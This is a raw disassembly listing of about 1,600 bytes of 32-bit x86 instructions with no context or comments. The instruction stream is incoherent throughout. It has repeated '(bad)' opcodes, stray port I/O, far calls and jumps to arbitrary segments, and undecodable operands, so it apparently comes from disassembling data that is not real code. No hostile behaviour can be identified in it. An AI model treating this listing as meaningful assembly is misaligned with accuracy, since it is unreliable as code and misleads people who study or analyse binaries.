  42231a:	mov    cl,0x34
  42231c:	out    0x37,eax
  42231e:	xor    eax,0xd284800f
  422323:	xchg   ecx,eax
  422324:	cmp    DWORD PTR [ebx],edi
  422326:	jo     0x42236e
  422328:	leave  
  422329:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  42232b:	test   al,0x78
  42232d:	mov    al,0x24
  42232f:	adc    BYTE PTR [ebx+0x62a0390a],bl
  422335:	push   0xffffff9c
  422337:	mov    DWORD PTR [ecx],edx
  422339:	push   es
  42233a:	mov    ebp,0xce6bc460
  42233f:	(bad)  
  422340:	push   ecx
  422341:	jecxz  0x422383
  422343:	adc    eax,0x7fbff5b9
  422348:	neg    bl
  42234a:	data16 jo 0x4222ec
  42234d:	inc    esi
  42234e:	hlt    
  42234f:	shl    DWORD PTR [ecx-0x6a77e513],1
  422355:	xchg   esi,eax
  422356:	cmp    esi,eax
  422358:	scas   al,BYTE PTR es:[edi]
  422359:	int    0x5c
  42235b:	lock cmc 
  42235d:	gs inc edx
  42235f:	repz push ds
  422361:	push   cs
  422362:	out    dx,al
  422363:	outs   dx,BYTE PTR ds:[esi]
  422364:	popa   
  422365:	retf   0xac73
  422368:	jnp    0x422388
  42236a:	mov    ds:0x1db45de6,al
  42236f:	push   esp
  422370:	xchg   edi,eax
  422371:	cmc    
  422372:	dec    edi
  422373:	and    BYTE PTR [edi],cl
  422375:	cmp    esi,ebx
  422377:	ins    DWORD PTR es:[edi],dx
  422378:	jae    0x42236a
  42237a:	clc    
  42237b:	dec    edx
  42237c:	addr16 mov ecx,0x44f96371
  422382:	mov    BYTE PTR ds:0xfa458321,0xbc
  422389:	jae    0x42237d
  42238b:	bound  esi,QWORD PTR [eax+edx*2+0xe]
  42238f:	mov    ebx,0x330d8bf4
  422394:	jmp    0x13c72a0b
  422399:	mov    ebp,0xbec47eae
  42239e:	dec    esp
  42239f:	inc    esi
  4223a0:	ss into 
  4223a2:	inc    esi
  4223a3:	leave  
  4223a4:	enter  0xdec5,0x29
  4223a8:	add    eax,0xf92e6780
  4223ad:	add    eax,0xbc5197a3
  4223b2:	cmp    dh,bl
  4223b4:	sub    BYTE PTR [edi+0x64],cl
  4223b7:	idiv   al
  4223b9:	jnp    0x4223dc
  4223bb:	fisubr DWORD PTR [edx+0x2149e92f]
  4223c1:	xchg   ebp,eax
  4223c2:	pop    edx
  4223c3:	mov    ebx,0xa009ef
  4223c8:	es push cs
  4223ca:	cmp    DWORD PTR [ebx],edi
  4223cc:	call   0x7a0a:0x24ef20c9
  4223d3:	sub    DWORD PTR [esp+eiz*2],eax
  4223d6:	sub    edi,DWORD PTR [esi+0x7d]
  4223d9:	idiv   DWORD PTR [eax+0x58]
  4223dc:	add    BYTE PTR [eax-0x26],bl
  4223df:	popf   
  4223e0:	mov    esp,DWORD PTR [ebx]
  4223e2:	daa    
  4223e3:	mov    eax,ds:0xa404bcb5
  4223e8:	popa   
  4223e9:	xchg   esp,eax
  4223ea:	adc    DWORD PTR [ebp+0xd],0x7eea4465
  4223f1:	mov    ecx,0x1411629b
  4223f6:	xchg   BYTE PTR [ecx+0x3d411c63],cl
  4223fc:	lods   eax,DWORD PTR ds:[esi]
  4223fd:	lahf   
  4223fe:	fiadd  DWORD PTR [ebp+0x356138e2]
  422404:	pop    edx
  422405:	push   esp
  422406:	(bad)  
  422407:	sub    ah,ch
  422409:	jb     0x4223a6
  42240b:	pop    es
  42240c:	leave  
  42240d:	clc    
  42240e:	popa   
  42240f:	jbe    0x42240a
  422411:	je     0x42247f
  422413:	push   ecx
  422414:	push   ebp
  422415:	push   ss
  422416:	stos   DWORD PTR es:[edi],eax
  422417:	push   esi
  422418:	(bad)  
  422419:	ins    DWORD PTR es:[edi],dx
  42241a:	retf   0xb3d4
  42241d:	pop    esi
  42241e:	sub    dl,BYTE PTR [eax-0x5773bf2]
  422424:	add    al,0xc6
  422426:	bound  ebp,QWORD PTR [edi+0x78]
  422429:	call   0x97ba273e
  42242e:	xor    cl,BYTE PTR [esi-0x17806a3a]
  422434:	pop    edx
  422435:	xor    ecx,ecx
  422437:	sub    eax,0xfdde081e
  42243c:	pop    ebp
  42243d:	push   esp
  42243e:	scas   eax,DWORD PTR es:[edi]
  42243f:	aad    0x97
  422441:	ret    0x95ac
  422444:	fnsave ds:0x5bbf492a
  42244a:	xlat   BYTE PTR ds:[ebx]
  42244b:	adc    DWORD PTR [edx],0x7b82ebe1
  422451:	push   es
  422452:	iret   
  422453:	cmp    BYTE PTR [esi+0x76],al
  422456:	xchg   esi,eax
  422457:	mov    eax,ds:0x2b9d959d
  42245c:	inc    edi
  42245d:	sbb    esi,DWORD PTR [esi+0x1c]
  422460:	in     eax,0x61
  422462:	mov    ds:0x9d98e7d5,eax
  422467:	adc    edi,0x6a
  42246a:	pop    ebx
  42246b:	sbb    ecx,edi
  42246d:	jns    0x4224dd
  42246f:	xor    DWORD PTR [esi-0x4f11b7e4],ecx
  422475:	and    eax,DWORD PTR [edx+0x7aae6a2f]
  42247b:	or     dh,BYTE PTR ds:[edi]
  42247e:	fld    DWORD PTR [ebx+esi*1+0x6455f63b]
  422485:	call   0x57589269
  42248a:	fstp   DWORD PTR [ecx-0x1b2f94a9]
  422490:	inc    ecx
  422491:	loopne 0x422460
  422493:	lea    eax,[ecx]
  422495:	loop   0x422452
  422497:	lahf   
  422498:	push   cs
  422499:	enter  0x14a4,0xb9
  42249d:	mov    ebx,0x23744369
  4224a2:	mov    al,dh
  4224a4:	in     eax,0xc4
  4224a6:	mov    ebp,0x8476f055
  4224ab:	test   eax,0x8a19808a
  4224b0:	dec    BYTE PTR [esi+0x18c01913]
  4224b6:	cmp    al,0x83
  4224b8:	cs rcr bl,cl
  4224bb:	sub    edx,DWORD PTR [edx]
  4224bd:	mov    ecx,0x1027936f
  4224c2:	shr    DWORD PTR [ebx],1
  4224c4:	outs   dx,BYTE PTR ds:[esi]
  4224c5:	pop    ds
  4224c6:	mov    eax,0xe20cabed
  4224cb:	cld    
  4224cc:	mov    ah,0x96
  4224ce:	or     al,0x0
  4224d0:	mov    BYTE PTR [edi+ebp*4+0x43],ch
  4224d4:	sbb    al,0x9e
  4224d6:	sub    edx,ebx
  4224d8:	add    eax,DWORD PTR gs:[ebp+0x2b]
  4224dc:	mov    eax,ds:0x1c65b72d
  4224e1:	loop   0x4224ab
  4224e3:	rcr    WORD PTR [eax],cl
  4224e6:	and    BYTE PTR [edx+0x5c],bh
  4224e9:	icebp  
  4224ea:	pop    esi
  4224eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224ec:	jmp    0x175a:0xbcf8e289
  4224f3:	add    edi,DWORD PTR [ebx]
  4224f5:	and    BYTE PTR [edx+0x53],bl
  4224f8:	mov    dh,0x10
  4224fa:	dec    ecx
  4224fb:	call   0x31e7:0xde6d7e50
  422502:	push   ds
  422503:	push   0x51
  422505:	shl    DWORD PTR [ebp+0x1c],cl
  422508:	inc    edi
  422509:	lods   al,BYTE PTR ds:[esi]
  42250a:	add    DWORD PTR [eax-0x6b7f1d7],ebx
  422510:	lea    ebx,[esi+0x3153b5]
  422516:	or     edi,0x59e9f79b
  42251c:	dec    esp
  42251d:	push   eax
  42251e:	icebp  
  42251f:	int    0x73
  422521:	cli    
  422522:	ja     0x42256c
  422524:	fstp   DWORD PTR [esi-0x6f1f24c4]
  42252a:	xor    al,0x8f
  42252c:	in     eax,0xaa
  42252e:	jo     0x4224ea
  422530:	scas   al,BYTE PTR es:[edi]
  422531:	push   edi
  422532:	clc    
  422533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422534:	xchg   ebx,eax
  422535:	xor    dh,BYTE PTR [edi+ebp*2+0x45]
  422539:	popa   
  42253a:	add    DWORD PTR [ecx+0x45],esp
  42253d:	mov    bh,0x10
  42253f:	sub    ecx,DWORD PTR [ebx]
  422541:	and    bl,BYTE PTR [eax]
  422543:	repnz stc 
  422545:	mov    eax,ds:0x67b3740e
  42254a:	cwde   
  42254b:	(bad)  
  42254c:	jmp    0x6e98ace9
  422551:	icebp  
  422552:	xchg   edx,eax
  422553:	ins    BYTE PTR es:[edi],dx
  422554:	pop    edi
  422555:	ins    BYTE PTR es:[edi],dx
  422556:	dec    ecx
  422557:	sbb    DWORD PTR [edx-0x30],edi
  42255a:	jo     0x4225d8
  42255c:	lds    ebx,FWORD PTR [edx+0x48]
  42255f:	xchg   ebp,eax
  422560:	sub    bl,BYTE PTR [ebx]
  422562:	ds jnp 0x4225d4
  422565:	push   eax
  422566:	push   esp
  422567:	push   esp
  422568:	mov    ds:0x6d3d6792,eax
  42256d:	(bad)  
  42256e:	adc    ecx,edx
  422570:	or     eax,0xc72a1ec
  422575:	lock adc dl,bl
  422578:	push   ss
  422579:	sbb    bl,ch
  42257b:	pop    ebx
  42257c:	push   ecx
  42257d:	jo     0x422555
  42257f:	mov    ds:0x8202123a,al
  422584:	stos   DWORD PTR es:[edi],eax
  422585:	ss repnz nop
  422588:	fild   QWORD PTR [edi+0x51a20f40]
  42258e:	mov    cs,WORD PTR [esi+0x1583a4d8]
  422594:	mov    ds:0xf406a6cc,al
  422599:	sbb    esp,DWORD PTR [edi-0x6c6becf9]
  42259f:	pop    esi
  4225a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225a1:	xchg   ecx,eax
  4225a2:	in     eax,dx
  4225a3:	idiv   BYTE PTR ds:0x1151e433
  4225a9:	out    0x57,al
  4225ab:	or     dh,BYTE PTR [ebp+0x6e1574f9]
  4225b1:	fwait
  4225b2:	das    
  4225b3:	fwait
  4225b4:	push   ds
  4225b5:	xchg   ebx,eax
  4225b6:	and    bl,ch
  4225b8:	jae    0x4225df
  4225ba:	jae    0x4225d6
  4225bc:	cdq    
  4225bd:	mov    esi,0x9f4ae262
  4225c2:	mov    BYTE PTR ds:0x7f37d134,ah
  4225c8:	add    al,0x98
  4225ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225cb:	lock outs dx,BYTE PTR ds:[esi]
  4225cd:	neg    DWORD PTR [esi+0x245bb1cb]
  4225d3:	(bad)  
  4225d4:	or     BYTE PTR [esi+0x12bd6270],al
  4225da:	aad    0x5
  4225dc:	push   ecx
  4225dd:	shl    BYTE PTR [esi+0x4bced106],0x88
  4225e4:	fld    TBYTE PTR [ebp+0x3a]
  4225e7:	or     ch,BYTE PTR [ebx-0xa]
  4225ea:	ja     0x4225e4
  4225ec:	ja     0x42260b
  4225ee:	ins    DWORD PTR es:[edi],dx
  4225ef:	jns    0x422640
  4225f1:	pop    esi
  4225f2:	push   ss
  4225f3:	push   esi
  4225f4:	std    
  4225f5:	and    dl,dl
  4225f7:	je     0x4225c0
  4225f9:	shr    BYTE PTR [esi+0x45dac17a],0x2c
  422600:	clc    
  422601:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422602:	(bad)  
  422603:	pop    esi
  422604:	retf   0x3202
  422607:	jno    0x4225f7
  422609:	repnz ins DWORD PTR es:[edi],dx
  42260b:	add    dl,al
  42260d:	jo     0x42263b
  42260f:	mov    al,0xb5
  422611:	ret    0xef19
  422614:	push   ebx
  422615:	rcl    ebp,0x92
  422618:	cmp    ebx,DWORD PTR [edx-0x78]
  42261b:	popa   
  42261c:	stc    
  42261d:	or     al,BYTE PTR [esi-0x1544bc10]
  422623:	jb     0x42266c
  422625:	push   esi
  422626:	mov    bh,0x87
  422628:	sbb    ebx,edx
  42262a:	cmp    esp,edx
  42262c:	dec    esi
  42262d:	pop    eax
  42262e:	outs   dx,DWORD PTR ds:[esi]
  42262f:	mov    ebx,0xb5ec6b1f
  422634:	sbb    dh,BYTE PTR [edx+ecx*8+0x60]
  422638:	mov    al,0xea
  42263a:	push   es
  42263b:	cmp    al,0x5c
  42263d:	fwait
  42263e:	push   esi
  42263f:	icebp  
  422640:	lock cmp eax,0xf654dfac
  422646:	mov    ch,0x1f
  422648:	sbb    eax,0xa16f45c4
  42264d:	or     eax,esp
  42264f:	xlat   BYTE PTR ds:[ebx]
  422650:	push   edi
  422651:	add    BYTE PTR [ebx],ch
  422653:	pop    es
  422654:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422655:	lock in eax,dx
  422657:	sbb    ebp,DWORD PTR [eax+0x1d]
  42265a:	mov    fs,WORD PTR [eax+0x3251128d]
  422660:	in     al,dx
  422661:	test   cl,dl
  422663:	dec    esi
  422664:	add    cl,BYTE PTR [esi]
  422666:	xlat   BYTE PTR ds:[ebx]
  422667:	daa    
  422668:	imul   ecx,edx,0x1c
  42266b:	mov    ch,0x22
  42266d:	push   edx
  42266e:	mov    ds:0xf4ef8adb,al
  422673:	jp     0x4226d4
  422675:	in     eax,0x95
  422677:	and    DWORD PTR [ecx],edi
  422679:	mov    bl,0xb2
  42267b:	ja     0x4226a1
  42267d:	jle    0x422666
  42267f:	push   ebp
  422680:	idiv   BYTE PTR [ecx]
  422682:	pop    ebx
  422683:	sub    bh,BYTE PTR gs:0x4d0f1601
  42268a:	dec    edi
  42268b:	adc    eax,0xc0366f0f
  422690:	test   eax,0xdbc0e8de
  422695:	xchg   edi,eax
  422696:	sbb    esi,ebx
  422698:	fcmovnu st,st(5)
  42269a:	(bad)  
  42269b:	rol    BYTE PTR [eax-0x2f75cb99],cl
  4226a1:	push   ebx
  4226a2:	stos   BYTE PTR es:[edi],al
  4226a3:	push   ecx
  4226a4:	enter  0x542c,0xb9
  4226a8:	call   0x248a:0xb5b5f6b7
  4226af:	push   esi
  4226b0:	ret    0x9bc2
  4226b3:	inc    edx
  4226b4:	pop    ebp
  4226b5:	rol    BYTE PTR [edx+eax*4-0x31ea8bb4],0x67
  4226bd:	std    
  4226be:	xor    BYTE PTR [ebx],0xb0
  4226c1:	inc    esp
  4226c2:	mov    ebx,0x39b5b12
  4226c7:	add    eax,0x79041a0
  4226cc:	sub    ah,ch
  4226ce:	add    BYTE PTR [edi+0x23],0xc4
  4226d2:	mov    bl,0x9c
  4226d4:	adc    cl,ah
  4226d6:	dec    edi
  4226d7:	push   ebp
  4226d8:	retf   0x9140
  4226db:	add    edi,DWORD PTR [eax-0x56]
  4226de:	sub    al,0x1d
  4226e0:	xor    eax,0xfa7a6b0d
  4226e5:	std    
  4226e6:	in     al,dx
  4226e7:	mov    ah,0x24
  4226e9:	and    eax,0x186c74d
  4226ee:	out    0xeb,eax
  4226f0:	jecxz  0x42268f
  4226f2:	gs inc eax
  4226f4:	arpl   WORD PTR [esi+0x4c4d4579],cx
  4226fa:	or     bh,BYTE PTR ds:0xad9599ff
  422700:	add    edx,esp
  422702:	leave  
  422703:	stos   BYTE PTR es:[edi],al
  422704:	or     esi,DWORD PTR [esi]
  422706:	or     edx,DWORD PTR [edx+0x68]
  422709:	loope  0x422690
  42270b:	xchg   edx,eax
  42270c:	adc    ebx,DWORD PTR [ebp-0x1fd73e52]
  422712:	jle    0x422773
  422714:	gs add esp,edi
  422717:	int3   
  422718:	mov    eax,0xf043db5
  42271d:	outs   dx,BYTE PTR ds:[esi]
  42271e:	int    0xcd
  422720:	sbb    BYTE PTR [ebx+eiz*4-0x6b],bh
  422724:	and    DWORD PTR [edi+0x3],esp
  422727:	push   esi
  422728:	push   ss
  422729:	dec    ecx
  42272a:	xor    eax,esp
  42272c:	mov    al,ds:0x2b048fb4
  422731:	adc    bl,BYTE PTR ds:[edi+0x5b]
  422735:	mov    ?,WORD PTR [eax+0x7b0678af]
  42273b:	add    BYTE PTR [edx+eiz*4],bh
  42273e:	mov    edi,0x1dbca15a
  422743:	lahf   
  422744:	pop    es
  422745:	les    esp,FWORD PTR [edx]
  422747:	mov    al,ds:0xd1764d43
  42274c:	push   edx
  42274d:	jl     0x4227ad
  42274f:	je     0x422760
  422751:	fnstenv [edx]
  422753:	and    bl,BYTE PTR [ecx-0x50]
  422756:	aad    0xc5
  422758:	mov    ds:0xd74eb43e,al
  42275d:	mov    esi,0x4baad365
  422762:	sahf   
  422763:	int    0xcc
  422765:	sbb    DWORD PTR [ebp-0x6d],0xe4579a1f
  42276c:	loope  0x4227b7
  42276e:	cmp    BYTE PTR [edx+ebp*4],ch
  422771:	push   ss
  422772:	push   ebx
  422773:	push   0x3cec2bf8
  422778:	and    ebx,edx
  42277a:	adc    ebx,esi
  42277c:	add    bh,bh
  42277e:	mov    BYTE PTR [edx+0x42],dh
  422781:	dec    edi
  422782:	mov    ebx,0x3575c3bb
  422787:	xchg   BYTE PTR [ebp+eiz*4+0x2514532e],bh
  42278e:	inc    edx
  42278f:	pop    edx
  422790:	cmp    ch,BYTE PTR [eax]
  422792:	fs push eax
  422794:	fild   DWORD PTR [edi]
  422796:	push   ecx
  422797:	jns    0x42279e
  422799:	sbb    eax,0xf0bda98b
  42279e:	or     eax,0x27baf058
  4227a3:	xor    BYTE PTR [ecx-0x7931c84b],ah
  4227a9:	adc    DWORD PTR [ebx],0xffffff8b
  4227ac:	mov    ebp,0x2227e847
  4227b1:	imul   edx,DWORD PTR [esi-0x78f9a2cc],0xfd608f1b
  4227bb:	and    BYTE PTR [ecx],0x6b
  4227be:	sbb    DWORD PTR [esp+edx*2+0x279b4e56],ebp
  4227c5:	(bad)  
  4227c6:	push   esp
  4227c7:	mov    bl,0xb9
  4227c9:	popf   
  4227ca:	mov    edx,0x6181a18f
  4227cf:	add    DWORD PTR [edi+0x29a10774],edx
  4227d5:	jl     0x422779
  4227d7:	repz cmp ecx,esi
  4227da:	imul   esp,ebx,0xddd6f619
  4227e0:	pop    ebp
  4227e1:	push   edi
  4227e2:	xor    al,0xa6
  4227e4:	fnstcw WORD PTR [ebp+0x5c5189d8]
  4227ea:	out    dx,al
  4227eb:	rcr    BYTE PTR [edi+0x8],1
  4227ee:	adc    DWORD PTR [eax+0x114519f7],ebx
  4227f4:	test   al,0xe0
  4227f6:	pop    ss
  4227f7:	xchg   esi,eax
  4227f8:	mov    bl,cl
  4227fa:	jmp    0xa611:0x578b213b
  422801:	push   ss
  422802:	mov    bl,0x79
  422804:	mov    dh,0xf1
  422806:	call   0x153d:0xcc7631f4
  42280d:	or     esi,DWORD PTR [ecx+0x6c7560bd]
  422813:	pop    edx
  422814:	fwait
  422815:	pop    es
  422816:	imul   edi,DWORD PTR [edx+eax*4+0x21],0xffffff86
  42281b:	sub    ebx,DWORD PTR [edi]
  42281d:	out    dx,al
  42281e:	pop    esp
  42281f:	test   al,0x2f
  422821:	push   esi
  422822:	ins    BYTE PTR es:[edi],dx
  422823:	sub    esp,edi
  422825:	popf   
  422826:	xor    DWORD PTR [eax+0x12542ad7],ebp
  42282c:	dec    eax
  42282d:	mov    gs,ebp
  42282f:	mov    ?,eax
  422831:	mov    edi,0x24141d4d
  422836:	(bad)  
  422837:	fidivr WORD PTR [ebp-0x41]
  42283a:	jo     0x422892
  42283c:	mov    ah,BYTE PTR [eax]
  42283e:	scas   al,BYTE PTR es:[edi]
  42283f:	retf   
  422840:	into   
  422841:	data16 fwait
  422843:	scas   eax,DWORD PTR es:[edi]
  422844:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422845:	pusha  
  422846:	lahf   
  422847:	mov    esp,0x95a1301a
  42284c:	das    
  42284d:	pop    edx
  42284e:	rol    DWORD PTR ds:0xfea80663,cl
  422854:	add    al,0x51
  422856:	push   ebx
  422857:	out    dx,eax
  422858:	retf   
  422859:	pop    ebx
  42285a:	inc    eax
  42285b:	pop    es
  42285c:	jl     0x422860
  42285e:	out    dx,eax
  42285f:	adc    bh,BYTE PTR [ecx+eax*2+0x23a0d9d9]
  422866:	push   ecx
  422867:	call   0xd3d1:0x58c357e9
  42286e:	xchg   ecx,eax
  42286f:	cli    
  422870:	test   DWORD PTR [eax],ebp
  422872:	add    ah,bh
  422874:	dec    ebx
  422875:	pop    ds
  422876:	outs   dx,DWORD PTR ds:[esi]
  422877:	outs   dx,DWORD PTR ds:[esi]
  422878:	jae    0x42283b
  42287a:	xchg   ebp,eax
  42287b:	xlat   BYTE PTR ds:[ebx]
  42287c:	xchg   DWORD PTR [ebx+eiz*4+0x74d521e],edi
  422883:	mov    ah,0xba
  422885:	sub    dl,bl
  422887:	adc    esi,DWORD PTR [eax]
  422889:	adc    al,0x3
  42288b:	test   dl,al
  42288d:	push   0xffffffa0
  42288f:	and    al,0xa1
  422891:	icebp  
  422892:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422893:	je     0x4228fd
  422895:	ror    DWORD PTR [esi-0x6b7f53a0],0x8
  42289c:	ja     0x4228a2
  42289e:	or     eax,0x555cfe60
  4228a3:	jmp    0x638dc6be
  4228a8:	jecxz  0x422836
  4228aa:	ret    0x8001
  4228ad:	(bad)  
  4228ae:	jns    0x422837
  4228b0:	adc    eax,0x9d922c3c
  4228b5:	jmp    0x90d2:0xcc5bc8b1
  4228bc:	sar    DWORD PTR [eax-0x5e],cl
  4228bf:	jo     0x4228c5
  4228c1:	das    
  4228c2:	push   edi
  4228c3:	xchg   esi,eax
  4228c4:	mov    ah,0x9e
  4228c6:	xor    DWORD PTR [ecx-0x72],esi
  4228c9:	int3   
  4228ca:	ins    BYTE PTR es:[edi],dx
  4228cb:	mov    al,0xff
  4228cd:	cli    
  4228ce:	cmc    
  4228cf:	rol    ah,cl
  4228d1:	out    dx,eax
  4228d2:	xchg   esp,eax
  4228d3:	pop    edi
  4228d4:	loope  0x422940
  4228d6:	mov    ds:0x360956d8,al
  4228db:	adc    al,0xc1
  4228dd:	iret   
  4228de:	pop    ebp
  4228df:	xor    BYTE PTR [esi+0x605acae8],dl
  4228e5:	mov    cs:0x88794d2f,eax
  4228eb:	xchg   edi,eax
  4228ec:	lahf   
  4228ed:	fst    QWORD PTR [eax-0x56]
  4228f0:	xor    cl,BYTE PTR [edx-0x579a0c65]
  4228f6:	mov    DWORD PTR [ecx],esi
  4228f8:	test   eax,0xa2fa1814
  4228fd:	pop    es
  4228fe:	or     ebx,DWORD PTR [edi]
  422900:	add    BYTE PTR [ebx-0x31],0x47
  422904:	lahf   
  422905:	jmp    0xf0d22b00
  42290a:	cdq    
  42290b:	bound  edx,QWORD PTR [edx+ebp*4]
  42290e:	and    dl,BYTE PTR [eax-0x15]
  422911:	retf   0x809e
  422914:	xor    ah,BYTE PTR [edx+0xb3c2d3b]
  42291a:	and    BYTE PTR [ebx],ah
  42291c:	xchg   esp,eax
  42291d:	out    dx,eax
  42291e:	rcr    BYTE PTR [ebx+0x22],cl
  422921:	push   ss
  422922:	adc    al,0x34
  422924:	pop    edx
  422925:	push   esi
  422926:	sti    
  422927:	aaa    
  422928:	push   0x900b9dcb
  42292d:	aad    0xe2
  42292f:	mov    ds:0x4bcb7b26,al
  422934:	into   
  422935:	adc    eax,0xed86500e
  42293a:	dec    ebp
  42293b:	in     al,0x43
  42293d:	inc    esp
  42293e:	pop    ebx
  42293f:	and    BYTE PTR [edi+ecx*4+0x77],bh
  422943:	std    
  422944:	and    ebp,eax
  422946:	mov    esi,0x4f2114de
  42294b:	enter  0x76d9,0x85
  42294f:	loop   0x422914
  422951:	add    BYTE PTR [ebp+0x22],cl
  422954:	adc    eax,0x6aed14f2
  422959:	ror    ebx,0x8f
  42295c:	(bad)  
  42295d:	jnp    0x4228f7
  42295f:	push   ebp
  422960:	je     0x4229d9
  422962:	and    cl,BYTE PTR [eax-0x5e]
  422965:	add    dl,0x1a
  422968:	(bad)  
  422969:	clc    
  42296a:	(bad)  
  42296b:	dec    edx
  42296c:	ss jmp 0xa204:0x21c40ab0
  422974:	inc    ebx
  422975:	ret    
  422976:	add    eax,0xa6875336
  42297b:	les    esp,FWORD PTR [edi-0xd]
  42297e:	xchg   ecx,eax
  42297f:	cwde   
  422980:	xchg   BYTE PTR [edi+0x5b],dl
  422983:	pop    es
  422984:	jecxz  0x422986
  422986:	cmp    esi,eax
  422988:	inc    ebx
  422989:	shr    BYTE PTR [ebp+0x4d460eff],1
  42298f:	cmp    dl,BYTE PTR [edi+0x44]
  422992:	leave  
  422993:	iret   
  422994:	xchg   esp,eax
  422995:	ss nop
  422997:	push   es
  422998:	dec    ebp
  422999:	shl    BYTE PTR [esp+ecx*2-0x49bd8095],0xa3
  4229a1:	shl    DWORD PTR ss:[edi+0x16],0x21
  4229a6:	sbb    bl,BYTE PTR [edx-0x56]
  4229a9:	xlat   BYTE PTR ds:[ebx]
  4229aa:	lock pop esp
  4229ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229ad:	adc    BYTE PTR [ecx],bh
  4229af:	es loope 0x422a1f
  4229b2:	arpl   WORD PTR [ebx+ebx*8],di
  4229b5:	out    dx,eax
  4229b6:	ret    0x2085
  4229b9:	pop    esi
  4229ba:	jmp    0x5313:0x9f395671
  4229c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229c2:	and    dh,BYTE PTR [edx]
  4229c4:	inc    esp
  4229c5:	pop    ebx
  4229c6:	popf   
  4229c7:	cmp    BYTE PTR [edi-0x16],dl
  4229ca:	inc    esp
  4229cb:	retf   0xca57
  4229ce:	push   ebx
  4229cf:	fiadd  WORD PTR [ecx-0x7ad41b48]
  4229d5:	arpl   sp,bp
  4229d7:	ja     0x42298b
  4229d9:	stos   BYTE PTR es:[edi],al
  4229da:	not    DWORD PTR [ecx+0x53]
  4229dd:	mov    bl,0x8d
  4229df:	mov    edx,0x8f70f554
  4229e4:	mov    ah,BYTE PTR [edi+esi*4]
  4229e7:	mov    bl,0xb4
  4229e9:	or     BYTE PTR ds:0x87d4c0b6,ch
  4229ef:	inc    edx
  4229f0:	es mov edi,0xe4f9a842
  4229f6:	gs jle 0x422a6c
  4229f9:	xchg   ebx,eax
  4229fa:	rol    DWORD PTR [ebx+0x7861af21],0x6f
  422a01:	dec    esi
  422a02:	pop    edi
  422a03:	xor    al,0x12
  422a05:	sub    al,dl
  422a07:	dec    edi
  422a08:	fwait
  422a09:	adc    eax,0x564aaabd
  422a0e:	cmc    
  422a0f:	xor    al,cl
  422a11:	and    al,0x67
  422a13:	push   eax
  422a14:	(bad)  
  422a15:	push   0x97293574
  422a1a:	inc    ecx
  422a1b:	push   es
  422a1c:	call   0x7fbd:0xc3ec8446
  422a23:	mov    esi,edx
  422a25:	adc    bl,BYTE PTR [ecx+ecx*4+0x99257a9]
  422a2c:	dec    esp
  422a2d:	(bad)  
  422a2e:	je     0x4229f8
  422a30:	retf   0x6381
  422a33:	pop    ss
  422a34:	jns    0x4229bb
  422a36:	dec    esp
  422a37:	mov    dh,0xb0
  422a39:	cmp    al,0x90
  422a3b:	(bad)  
  422a3c:	mov    WORD PTR [ebx-0x593fe6df],?
  422a42:	mov    ah,0x98
  422a44:	add    dl,ch
  422a46:	or     esi,DWORD PTR [edi+0x6a9592cc]
  422a4c:	inc    edi
  422a4d:	mov    al,0xbe
  422a4f:	in     eax,dx
  422a50:	lods   al,BYTE PTR ds:[esi]
  422a51:	sub    eax,0x79c55039
  422a56:	out    0x6c,eax
  422a58:	int    0xe8
  422a5a:	(bad)  
  422a5b:	jb     0x422ada
  422a5d:	xchg   BYTE PTR [ecx],ah
  422a5f:	mov    dh,0xf1
  422a61:	les    ebp,FWORD PTR [ecx+0x435ec128]
  422a67:	addr16 out 0x57,al
  422a6a:	sti    
  422a6b:	les    ebx,FWORD PTR [esi-0x5d]
  422a6e:	dec    edx
  422a6f:	dec    ecx
  422a70:	data16 cmp cl,BYTE PTR [ebx+eax*8]
  422a74:	push   edx
  422a75:	ror    DWORD PTR [edx+0x29],1
  422a78:	pop    ebx
  422a79:	dec    eax
  422a7a:	mov    ds:0x8a4e9c4d,al
  422a7f:	cdq    
  422a80:	mov    ebp,0x4cc0c74
  422a85:	and    al,0x59
  422a87:	popa   
  422a88:	pop    es
  422a89:	fwait
  422a8a:	clc    
  422a8b:	dec    ebx
  422a8c:	jecxz  0x422b07
  422a8e:	jl     0x422a70
  422a90:	cmp    DWORD PTR [edi-0x686a1698],0xa1b15956
  422a9a:	sbb    BYTE PTR [eax-0x3870aea2],bh
  422aa0:	lock add eax,DWORD PTR [esi]
  422aa3:	in     al,0xcd
  422aa5:	aam    0xb9
  422aa7:	mov    BYTE PTR ds:0x2c670492,dh
  422aad:	and    DWORD PTR [edx],edx
  422aaf:	and    BYTE PTR [ebp+0x47937e20],bl
  422ab5:	lods   eax,DWORD PTR ds:[esi]
  422ab6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ab7:	test   al,0x57
  422ab9:	cmp    dh,BYTE PTR [ebx]
  422abb:	clc    
  422abc:	(bad)  
  422abe:	mov    ecx,0xb0702ebd
  422ac3:	in     eax,0xb3
  422ac5:	pop    eax
  422ac6:	sbb    al,0x55
  422ac8:	aam    0x9b
  422aca:	xor    edi,DWORD PTR [edi]
  422acc:	and    DWORD PTR [edx+0x1426098e],ecx
  422ad2:	nop
  422ad3:	mov    ch,0x6e
  422ad5:	pop    es
  422ad6:	add    DWORD PTR [edx+0x72e8917],edx
  422adc:	gs cli 
  422ade:	adc    ecx,DWORD PTR [edi]
  422ae0:	mov    esi,DWORD PTR [ecx]
  422ae2:	inc    edx
  422ae3:	dec    ebp
  422ae4:	adc    eax,0xde9f5a94
  422ae9:	in     eax,0xb1
  422aeb:	pop    eax
  422aec:	cmp    BYTE PTR [edi-0x61b2f404],cl
  422af2:	mov    bl,0x9
  422af4:	mov    ds:0x8bdad66c,al
  422af9:	imul   edx,DWORD PTR [edi],0xf23413f6
  422aff:	test   BYTE PTR [ebx-0x52235871],0xb2
  422b06:	mov    al,ds:0x2a1b5895
  422b0b:	(bad)  
  422b0c:	(bad)  
  422b0d:	ds push 0x930f1dd8
  422b13:	xor    edx,edi
  422b15:	push   cs
  422b16:	dec    ebx
  422b17:	call   0x71f1:0xe072b093
